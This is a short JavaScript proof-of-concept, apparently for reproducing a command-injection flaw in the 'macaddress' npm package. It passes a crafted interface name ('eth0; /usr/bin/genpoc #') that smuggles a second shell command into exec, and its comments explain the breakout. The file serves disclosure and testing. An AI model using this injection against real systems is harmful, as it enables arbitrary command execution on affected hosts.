```js
async function exploit() {
    const macaddress = require('macaddress');

    // Vulnerable linux.js constructs the shell command via direct string concatenation:
    // exec("cat /sys/class/net/" + iface + "/address", callback);
    // Injecting ';' breaks out of the `cat` command, allowing us to execute arbitrary code.
    // The '#' symbol comments out the trailing '/address' suffix, ensuring the shell 
    // cleanly ignores it and only executes our payload.
    const maliciousIface = "eth0; /usr/bin/genpoc #";

    // Trigger the vulnerable API path
    macaddress.one(maliciousIface, (err, result) => {
        if (err) {
            console.log("[+] Vulnerability triggered: injected shell command will execute during `exec` parsing.");
        } else {
            console.log("[-] Unexpectedly succeeded:", result);
        }
    });

    // Allow the event loop time to spawn the injected process in a controlled environment
    await new Promise(resolve => setTimeout(resolve, 100));
}

await exploit();
